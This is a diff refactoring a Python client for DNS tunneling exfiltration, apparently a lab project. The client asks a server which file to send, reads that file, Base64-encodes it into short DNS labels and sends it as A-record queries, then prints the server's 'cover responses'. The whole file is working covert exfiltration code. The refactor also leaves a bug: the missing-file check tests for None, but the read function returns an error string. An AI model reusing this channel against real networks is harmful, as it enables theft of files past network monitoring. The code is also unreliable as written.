@@ -11,136 +11,135 @@ import hashlib
 DNS_SERVER = "127.0.0.1"
 DNS_PORT = 53  # default DNS port
 
+CHUNK_SIZE = 12        # bytes per chunk (before encoding)
+LABEL_LENGTH = 2       # characters per DNS label
 
-def b64_encode(data):  # data should already be bytes
+
+# Encoding Utilities
+def base64_dns_encode(data):  # data should already be bytes
     """Encode bytes to Base64 string safe for DNS labels"""
     return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")
 
 
-def dot_every_n(data, n):
-    """Insert a dot every n characters (for DNS labels)"""
-    return ".".join(data[i:i+n] for i in range(0, len(data), n))
+def split_chunks(data, size):
+    """Split bytes into fixed-size chunks"""
+    return [data[i:i + size] for i in range(0, len(data), size)]
 
 
-def split_bytes(data, chunk_size):
-    """Split bytes into chunks of given size"""
-    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
+def insert_dots(data, every):
+    """Insert a dot every n characters (DNS label formatting)"""
+    return ".".join(data[i:i + every] for i in range(0, len(data), every))
 
 
-def get_file(file_name):
+def prepare_dns_payload(data):
+    """Convert raw bytes into DNS-safe domain names"""
+    chunks = split_chunks(data, CHUNK_SIZE)
+    domains = []
+
+    for chunk in chunks:
+        encoded = base64_dns_encode(chunk)
+        domains.append(insert_dots(encoded, LABEL_LENGTH))
+
+    return domains
+
+
+# File Utilities
+def read_file(path):
     """Read file as bytes"""
     try:
-        with open(file_name, "rb") as f:
+        with open(path, "rb") as f:
             return f.read()
 
     except FileNotFoundError:
-        return "Error: The file does not exist"
+        return b"Error: The file does not exist"
 
 
-def get_msg_id(file_content):
-    """Generate a short 16-bit message ID from file hash"""
-    hash_object = hashlib.sha256(file_content)
-    hash_hex = hash_object.hexdigest()
-
-    # Take first 4 hex digits, convert to int
-    return int(hash_hex[:4], 16)
+def file_message_id(data: bytes) -> int:
+    """Generate deterministic 16-bit DNS message ID from file hash."""
+    digest = hashlib.sha256(data).hexdigest()
+    return int(digest[:4], 16)
 
 
-def generate_messages(to_send, chunk_size, n):  # to_send is bytes
-    """Split data into Base64-encoded DNS-safe chunks"""
-    chunks = split_bytes(to_send, chunk_size)
-    return [dot_every_n(b64_encode(chunk), n) for chunk in chunks]
+# DNS Communication
+def send_dns_queries(domains, record_type, msg_id=None):
+    """Send DNS queries and return responses."""
+    responses = []
 
+    for domain in domains:
+        query = dns.message.make_query(domain, record_type)
 
-def send_message(data, server_ip, msg_type, msg_id=None):
-    """
-        Send a DNS query using a custom ID.
-        - domain_or_bytes: either a string domain or raw bytes to encode
-        - msg_type: "TXT" or "A"
-        - msg_id: optional custom message ID
-    """
-    if isinstance(data, str):
-        data = data.encode("utf-8")
-
-    messages = generate_messages(data, 12, 2)
-    print(messages)
-
-    # Determine record type
-    if msg_type.upper() == "TXT":
-        rdtype = dns.rdatatype.TXT
-    elif msg_type.upper() == "A":
-        rdtype = dns.rdatatype.A
-    else:
-        raise ValueError(f"Unsupported record type: {msg_type}")
-
-    answers = []
-    for domain_str in messages:
-        # Create the DNS query
-        query = dns.message.make_query(domain_str, rdtype)
         if msg_id is not None:
-            query.id = msg_id  # Set custom message ID
+            query.id = msg_id
 
-        # Send the query with a longer timeout
         try:
-            response = dns.query.udp(query, server_ip, port=DNS_PORT, timeout=30)
-            answers.append(response)
+            response = dns.query.udp(
+                query,
+                DNS_SERVER,
+                port=DNS_PORT,
+                timeout=30
+            )
+            responses.append(response)
         except Exception as e:
-            print(f"DNS query error: {e}")
+            print(f"[!] DNS error for {domain}: {e}")
 
-    return answers
+    return responses
 
 
-def ask_which_file(server_ip):
-    """Ask the server which file to receive (TXT query)"""
-    responses = send_message("Which file would you like to receive", server_ip, "TXT")
-    if responses is None:
-        return None
+def send_control_txt(message: str):
+    """Send a TXT control message to the server."""
+    domain = insert_dots(
+        base64_dns_encode(message.encode()),
+        LABEL_LENGTH
+    )
+    return send_dns_queries([domain], dns.rdatatype.TXT)
 
-    for response in responses:  # iterate over each Message
-        if response is None:
-            continue
+
+# Client Logic
+def request_file_name():
+    """Ask the server which file should be sent."""
+    responses = send_control_txt("Which file would you like to receive")
+
+    for response in responses:
         for answer in response.answer:
             if answer.rdtype == dns.rdatatype.TXT:
-                for txt_item in answer.items:
-                    print(f"FILE: {txt_item.strings[0].decode()}")
-                    return txt_item.strings[0].decode(errors="ignore")
+                for rdata in answer:
+                    if rdata.strings:
+                        return rdata.strings[0].decode(errors="ignore")
+
     return None
 
 
-def send_file(file_name, server_ip):
-    """Send file content to server using DNS queries"""
-    file_content = get_file(file_name)
-    if b"Error" in file_content:
-        print("Requested file does not exist!")
+def send_file(path: str):
+    file_data = read_file(path)
+    if file_data is None:
+        print("[!] File not found.")
         return
 
-    file_length = len(file_content)
-    send_message(str(file_length), server_ip, "A")
+    # Send file length first
+    length_domains = prepare_dns_payload(str(len(file_data)).encode())
+    send_dns_queries(length_domains, dns.rdatatype.A)
 
-    msg_id = get_msg_id(file_content)
-    responses = send_message(file_content, server_ip, "A", msg_id)
+    # Send file content
+    msg_id = file_message_id(file_data)
+    data_domains = prepare_dns_payload(file_data)
+    responses = send_dns_queries(data_domains, dns.rdatatype.A, msg_id)
 
-    if responses is None:
-        print("No response received.")
-        return
-
-    # Print all responses (for learning/debugging)
-    for response in responses:  # iterate over each Message
-        if response is None:
-            continue
+    # Print server cover responses
+    for response in responses:
         for answer in response.answer:
             if answer.rdtype == dns.rdatatype.A:
                 for item in answer.items:
-                    print(f"Response IP: {item.address}")
+                    print(f"[<] Response IP: {item.address}")
 
 
 def main():
-    file_name = ask_which_file(DNS_SERVER)
+    file_name = request_file_name()
     if not file_name:
-        print("No file selected or server did not respond.")
+        print("[!] Server did not provide a file.")
         return
 
-    send_file(file_name, DNS_SERVER)
+    print(f"[+] Sending file: {file_name}")
+    send_file(file_name)
 
 
 if __name__ == "__main__":
